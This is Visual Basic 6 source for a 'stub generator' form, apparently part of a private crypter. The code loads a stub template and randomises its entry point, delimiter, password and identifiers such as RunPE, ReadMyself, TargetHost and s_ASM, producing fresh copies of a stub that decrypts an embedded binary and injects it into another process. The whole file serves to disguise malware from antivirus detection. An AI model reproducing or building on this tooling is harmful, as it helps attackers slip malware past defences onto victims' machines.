VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "[Blau][Privado] Generador Stubs"
   ClientHeight    =   7035
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   9420
   LinkTopic       =   "Form1"
   ScaleHeight     =   7035
   ScaleWidth      =   9420
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox txtPassword 
      Height          =   285
      Left            =   7680
      TabIndex        =   7
      Top             =   120
      Width           =   1575
   End
   Begin VB.TextBox txtDelimitador 
      Height          =   285
      Left            =   4560
      TabIndex        =   5
      Top             =   120
      Width           =   1815
   End
   Begin VB.TextBox txtMain 
      Height          =   285
      Left            =   1080
      TabIndex        =   3
      Top             =   120
      Width           =   2295
   End
   Begin VB.CommandButton btnCrear 
      Caption         =   "[ CREAR ]"
      Height          =   375
      Left            =   120
      TabIndex        =   1
      Top             =   6480
      Width           =   9135
   End
   Begin VB.TextBox txtStub 
      Height          =   5655
      Left            =   120
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   600
      Width           =   9135
   End
   Begin VB.Label Label3 
      Caption         =   "Password"
      Height          =   255
      Left            =   6480
      TabIndex        =   6
      Top             =   120
      Width           =   1095
   End
   Begin VB.Label Label2 
      Caption         =   "Delimitador"
      Height          =   255
      Left            =   3480
      TabIndex        =   4
      Top             =   120
      Width           =   1095
   End
   Begin VB.Label Label1 
      Caption         =   "Sub Main"
      Height          =   255
      Left            =   120
      TabIndex        =   2
      Top             =   120
      Width           =   855
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Public Function RandomString(ByVal Length As Long, Optional charset As String = "§ÐOwyMÌ×úcõtRöyúaQøksÞïKÌójvHðZögWó¹£½»³i") As String
    Dim chars() As Byte, value() As Byte, chrUprBnd As Long, i As Long
    If Length > 0& Then
        Randomize
        chars = charset
        chrUprBnd = Len(charset) - 1&
        Length = (Length * 2&) - 1&
        ReDim value(Length) As Byte
        For i = 0& To Length Step 2&
            value(i) = chars(CLng(chrUprBnd * Rnd) * 2&)
        Next
    End If
    RandomString = value
    RandomString = "B" & RandomString
    RandomString = Replace(RandomString, "?", "B")
End Function

Private Sub btnCrear_Click()
    Dim sStub As String, sMain As String, sDelimitador As String, sPassword As String, sVars() As String
    sStub = StrConv(LoadResData(101, "CUSTOM"), vbUnicode)
    
    sMain = RandomString(10)
    txtMain.Text = sMain
    sStub = Replace(sStub, "Main", sMain)
    
    sDelimitador = RandomString(10)
    txtDelimitador.Text = sDelimitador
    sStub = Replace(sStub, "AQUIVAELDELIMITADOR", sDelimitador)
    
    sPassword = RandomString(10)
    txtPassword.Text = sPassword
    sStub = Replace(sStub, "AQUIVALACONTRASEÑA", sPassword)
    
    sVars = Split("sMe,sDelimitador2,sDescifrado,sBinario,LHOkzoPGFR,eIDZqDPUcT,WokvHZXMKJ,sLLfywdtBJ,FzvYRYNJZZ,GSLDVUnNCw,POHsRpQZVi,RjLeQSXEox,QqYkDXkgcQ1,MebxTrztG1,iHdGIkvSRG,QqYkDXkgcQ,MebxTrztG,GetCurrentPath,1ReadMyself_ret,ReadMyself,SplitMyself,sDelimitador,RunPE_i,RunPE_j,RunPE_k,RunPE,TargetHost,bBuffer,s_ASM,b_ASM", ",")
    For i = 0 To UBound(sVars)
        sStub = Replace(sStub, sVars(i), RandomString(10))
    Next i
    'sStub = Replace(sStub, "LM\", RandomString(2) & "\")
    
    txtStub.Text = sStub
End Sub

Private Sub txtStub_GotFocus()
    txtStub.SelStart = 0
    txtStub.SelLength = Len(txtStub.Text)
End Sub
